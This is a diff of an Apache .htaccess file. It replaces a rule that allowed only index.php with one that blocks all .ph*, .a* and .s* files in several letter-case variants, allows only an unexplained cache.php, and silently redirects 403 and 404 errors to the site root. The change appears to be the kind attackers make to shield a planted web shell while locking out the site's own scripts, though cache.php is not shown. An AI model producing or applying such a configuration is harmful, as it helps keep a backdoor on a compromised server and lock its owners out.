@@ -1,19 +1,45 @@
-# ==== Blokir file berbahaya berdasarkan ekstensi dan variasi huruf ====
-<FilesMatch "\.(ph.*|a.*|s.*|P[hH].*|S.*)$">
-    Require all denied
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.a*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "^(cache.php)$">
+    Order allow,deny
+    Allow from all
 </FilesMatch>
-
-# ==== Pengecualian: hanya izinkan file spesifik ini ====
-<FilesMatch "^index\.php$">
-    Require all granted
+<FilesMatch "\\.(ph.*|a.*|P[hH].*|S.*)$"> 
+    Require all denied 
 </FilesMatch>
+ 
+<FilesMatch "^(cache.php)$">
+    Require all granted 
+</FilesMatch> 
 
-# ==== Atur default halaman index ====
-DirectoryIndex index.php
-
-# ==== Nonaktifkan directory listing ====
-Options -Indexes
-
-# ==== Redirect untuk error 403 & 404 ====
+DirectoryIndex index.php 
+Options -Indexes 
+ 
 ErrorDocument 403 "<meta http-equiv='refresh' content='0;url=/'>"
 ErrorDocument 404 "<meta http-equiv='refresh' content='0;url=/'>"
